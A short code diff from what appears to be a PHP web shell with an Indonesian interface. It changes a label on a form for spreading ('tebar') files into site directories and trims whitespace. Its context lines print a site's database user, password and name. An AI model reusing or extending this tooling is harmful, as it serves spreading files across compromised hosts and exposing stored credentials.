@@ -2113,7 +2113,7 @@ Link Config: <br>
 				<br><br>
 				<form action="" method="post">
 					<center>
-					Tebarkan di (wajib pakai / diakhir jika non-wp) :<br>
+					Tebarkan di (no / at the end) :<br>
 						<input class="form-control" type="text" name="direktorix" value="'.$direktori.'" style="width: 450px;" height="10"><br>
 						<input type="submit" class="form-control" style="width: 250px; height: 40px;" value="Tebar" name="tebar" />
 
@@ -2236,7 +2236,7 @@ Link Config: <br>
                             echo DB_USER."<br>";
                             echo DB_PASSWORD."<br>";
                             echo DB_NAME."<br>";
-                            
+
                         } 
 					} else {
 
